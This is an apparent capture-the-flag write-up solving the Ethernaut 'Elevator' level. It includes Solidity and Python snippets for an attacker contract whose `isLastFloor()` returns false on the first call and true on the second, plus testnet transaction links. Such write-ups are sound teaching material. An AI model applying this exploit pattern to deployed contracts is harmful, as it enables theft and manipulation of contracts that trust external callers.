# Elevator

## Objectives

This elevator won't let you reach the top of your building. Right?

## Solution

The returning value of `isLastFloor()` must be False for `floor` to change and for `top` to become true. Two ways to do this come to mind:

1. We make our top floor something that isn't 0 (the starting value of `floor`) and we check if `floor` is the number value of the top floor. Then we define the function `isLastFloor()` to return a comparison between the current `floor` and the top floor value.

2. We make a function that sends the elevator to its current floor (0), but we run this function twice, the first time, we make sure that `isLastFloor()` returns false, and then after this only true. This would effectively mean that our top floor is the 0th floor. But during that second run, `top` becomes true.

## How I did it

1. Create and deploy a Building contract (at: `0x970b299cCB253F5b4f58fEbde41Ffe2D2b25F885`) to interact with the Elevator contract where I define the `isLastFloor()` function:

```js
function isLastFloor(uint256) external returns (bool) {
    lastFloorBool = elevatorContract.floor() == topFloor;
    return lastFloorBool;
}
```

And a function to go to the top floor which calls `goTo()` in the elevator contract:

```js
function goToTopFloor() external {
    elevatorContract.goTo(topFloor);
}
```

2. Call the `goToTopFloor()` function which will first see that it's not at the top floor (`floor` is 0 initially), then floor changes and `floor` = `topFloor` and the second time `isLastFloor()` is called returns `true` which is then assigned to `top`.

```python
building.goToTopFloor(_from)
```

Block explorer: https://rinkeby.etherscan.io/tx/0x33bbab0e9b389cf24fb2118f1b07b350e53d8e358c36cbd94a536f9013fa386d

3. Check that `top` is true

```python
top_assertion = elevator.top() == True
print(f'We are at the top floor: {top_assertion}')
```

### Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x88d2597f20efca51b582e9ae46696320ab5fb77ae32aee5dc58a335ced32a9b2
